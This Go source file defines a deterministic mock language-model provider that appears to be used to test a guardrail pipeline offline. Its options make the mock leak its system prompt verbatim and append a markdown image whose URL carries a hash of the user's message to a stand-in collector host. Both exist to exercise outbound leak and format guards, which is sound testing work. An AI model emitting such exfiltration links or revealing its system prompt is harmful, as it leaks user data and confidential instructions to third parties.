package providers

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"strings"
	"time"

	"go.vicoworks.com/guard-rails-engine/internal/core"
	"go.vicoworks.com/guard-rails-engine/internal/tokenize"
)

// Mock is a deterministic in-process provider.
//
// It exists so the full pipeline -- including the outbound guards, cost
// accounting and the eval harness -- can be exercised in CI with no API key,
// no network, and no flakiness. Determinism is the point: the same request
// always produces the same completion, so a guardrail regression shows up as a
// test failure rather than as model variance.
//
// It can also be told to misbehave, which is how the outbound guards get
// tested against the failures they exist to catch.
type Mock struct {
	opts MockOptions
}

// MockOptions shapes the mock's behaviour.
type MockOptions struct {
	// Latency simulates upstream round-trip time.
	Latency time.Duration

	// EchoSystemPrompt makes the mock leak its system prompt, exercising the
	// outbound leak guard.
	EchoSystemPrompt bool

	// EmitImageExfil makes the mock append a markdown image with a payload
	// query string, exercising the format guard.
	EmitImageExfil bool

	// Script maps a substring of the last user message to a canned reply,
	// which is how eval fixtures pin specific completions.
	Script map[string]string

	// FailAfter makes the provider return an error once this many calls have
	// been served, for testing degraded-upstream behaviour.
	FailAfter int

	calls int
}

func NewMock(opts MockOptions) *Mock { return &Mock{opts: opts} }

func (m *Mock) Name() string { return "mock" }

func (m *Mock) Complete(ctx context.Context, req Request) (*Response, error) {
	m.opts.calls++
	if m.opts.FailAfter > 0 && m.opts.calls > m.opts.FailAfter {
		return nil, fmt.Errorf("mock: simulated upstream failure on call %d", m.opts.calls)
	}
	if m.opts.Latency > 0 {
		select {
		case <-time.After(m.opts.Latency):
		case <-ctx.Done():
			return nil, ctx.Err()
		}
	}

	last := lastUserMessage(req.Messages)

	var text string
	switch {
	case m.opts.EchoSystemPrompt && req.System != "":
		text = "Of course. My instructions are: " + req.System
	case scripted(m.opts.Script, last) != "":
		text = scripted(m.opts.Script, last)
	default:
		text = deterministicReply(last)
	}
	if m.opts.EmitImageExfil {
		text += "\n\n![](https://collector.example.net/p?d=" + fingerprint(last) + ")"
	}

	in := tokenize.EstimateMessages(req.System, contentsOf(req.Messages))
	return &Response{
		Model:      orDefault(req.Model, "mock-model"),
		Text:       text,
		StopReason: "end_turn",
		Usage: core.Usage{
			InputTokens:  in,
			OutputTokens: tokenize.Estimate(text),
		},
	}, nil
}

// CountTokens satisfies TokenCounter using the local estimator, so code paths
// that expect exact counting still work offline.
func (m *Mock) CountTokens(_ context.Context, req Request) (int, error) {
	return tokenize.EstimateMessages(req.System, contentsOf(req.Messages)), nil
}

// deterministicReply produces a stable, plausible answer. The hash keeps it
// varied across inputs without introducing randomness across runs.
func deterministicReply(prompt string) string {
	if strings.TrimSpace(prompt) == "" {
		return "I did not receive a question. Could you rephrase?"
	}
	templates := []string{
		"Here is a summary of what you asked about: %s",
		"Based on the information provided, %s appears to be the key point.",
		"I can help with that. Regarding %s, the short answer is yes.",
		"Thanks for the details. On %s, here is what I found.",
	}
	h := sha256.Sum256([]byte(prompt))
	idx := int(binary.BigEndian.Uint32(h[:4])) % len(templates)
	if idx < 0 {
		idx += len(templates)
	}
	return fmt.Sprintf(templates[idx], summarize(prompt))
}

func summarize(s string) string {
	fields := strings.Fields(s)
	if len(fields) > 12 {
		fields = fields[:12]
	}
	return strings.Join(fields, " ")
}

func fingerprint(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h[:8])
}

func scripted(script map[string]string, prompt string) string {
	low := strings.ToLower(prompt)
	for key, reply := range script {
		if strings.Contains(low, strings.ToLower(key)) {
			return reply
		}
	}
	return ""
}

func lastUserMessage(msgs []core.Message) string {
	for i := len(msgs) - 1; i >= 0; i-- {
		if msgs[i].Role == core.RoleUser {
			return msgs[i].Content
		}
	}
	if len(msgs) > 0 {
		return msgs[len(msgs)-1].Content
	}
	return ""
}

func contentsOf(msgs []core.Message) []string {
	out := make([]string, 0, len(msgs))
	for _, m := range msgs {
		out = append(out, m.Content)
	}
	return out
}

func orDefault(s, def string) string {
	if s == "" {
		return def
	}
	return s
}
